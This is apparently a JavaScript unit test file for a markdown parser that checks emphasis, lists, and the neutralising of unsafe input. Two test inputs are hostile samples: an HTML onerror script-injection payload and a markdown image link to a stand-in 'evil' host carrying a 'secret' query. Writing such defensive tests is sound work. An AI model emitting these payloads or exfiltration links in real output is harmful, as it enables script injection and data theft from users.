import assert from "node:assert/strict";
import { test } from "node:test";
import { blocks } from "../ui/markdown.js";

test("keeps raw HTML as text", () => {
  assert.deepEqual(blocks("<img src=x onerror=alert(1)>"), [{ type: "p", spans: [{ text: "<img src=x onerror=alert(1)>" }] }]);
});

test("reads bold, italics, and lists", () => {
  assert.deepEqual(blocks("**a** b\n\n- c\n- *d*"), [
    { type: "p", spans: [{ text: "a", bold: true }, { text: " b" }] },
    { type: "ul", items: [[{ text: "c" }], [{ text: "d", italic: true }]] },
  ]);
});

test("drops image and link syntax to plain text", () => {
  assert.deepEqual(blocks("![x](http://evil/?q=secret)"), [{ type: "p", spans: [{ text: "x" }] }]);
});

test("unclosed emphasis stays literal", () => {
  assert.deepEqual(blocks("**unclosed bold"), [{ type: "p", spans: [{ text: "**unclosed bold" }] }]);
  assert.deepEqual(blocks("*note: keep this"), [{ type: "p", spans: [{ text: "*note: keep this" }] }]);
  assert.deepEqual(blocks("ok **a** then *b"), [{ type: "p", spans: [{ text: "ok " }, { text: "a", bold: true }, { text: " then *b" }] }]);
});
